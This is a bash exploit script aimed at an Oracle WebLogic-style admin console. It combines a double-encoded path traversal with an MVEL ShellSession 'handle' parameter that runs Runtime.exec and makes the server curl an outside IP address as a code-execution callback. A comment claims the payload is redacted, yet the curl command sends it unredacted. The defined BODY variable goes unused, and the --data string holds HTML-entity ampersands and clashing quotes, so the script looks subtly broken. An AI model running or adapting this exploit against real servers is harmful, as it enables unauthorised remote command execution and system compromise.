#!/usr/bin/env bash

if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <host> <port>"
    exit 1
fi

HOST="$1"
PORT="$2"

URL="http://${HOST}:${PORT}/console/images/%252E%252E%252Fconsole.portal"

# Replace this with your own SAFE test payload or lab-only PoC
BODY="_nfpb=false&_pageLabel=HomePage1&handle=REDACTED_PAYLOAD"

curl -k -i \
  -X POST "$URL" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Connection: close" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "_nfpb=false&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec("curl http://10.219.105.42:80");")"
